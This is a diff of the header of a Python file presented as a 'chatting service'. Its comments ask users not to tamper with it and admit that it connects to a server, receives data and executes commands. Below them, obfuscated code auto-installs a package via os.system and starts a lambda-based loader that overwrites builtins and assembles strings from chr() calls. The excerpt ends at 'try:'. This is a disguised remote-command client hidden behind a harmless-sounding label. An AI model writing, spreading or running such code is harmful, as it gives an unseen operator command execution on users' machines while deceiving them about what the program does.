@@ -3,15 +3,13 @@
 
 # This is a program meant to be solely run within a command console.
 
-# The dependencies for this program will automatically install if you do not have them on this hosting service.
+# The dependencies for this program will automatically install if you do not have them on your hosting service.
 
-# PLEASE DO NOT TAMPER WITH THE CODE IN THIS FILE!
-
-### THIS IS NOT IN ANY WAY, SHAPE, OR FORM HARMFUL CODE!
+# PLEASE DO NOT TAMPER WITH THE CODE IN THIS FILE! This will break things and it will not function proper;y.
 #      This code is only meant to connect to a server, recieve data, and execute commands.
 #      This source-code file is obfuscated (hidden) only to protect sensitive info, like IP addresses and keys.
 
-# Please follow these rules, and have fun!
+# Please keep those things in mind, and enjoy version 1.2 of the chatting service!
 print("Installing dependencies...");__import__('os').system('pip install pycryptodome')
 pyobfuscate=(lambda getattr:[((lambda IIlII,IlIIl:setattr(__builtins__,IIlII,IlIIl))(IIlII,IlIIl)) for IIlII,IlIIl in getattr.items()]);Il=chr(114)+chr(101);lI=r'[^a-zA-Z0-9]';lIl=chr(115)+chr(117)+chr(98)
 try:
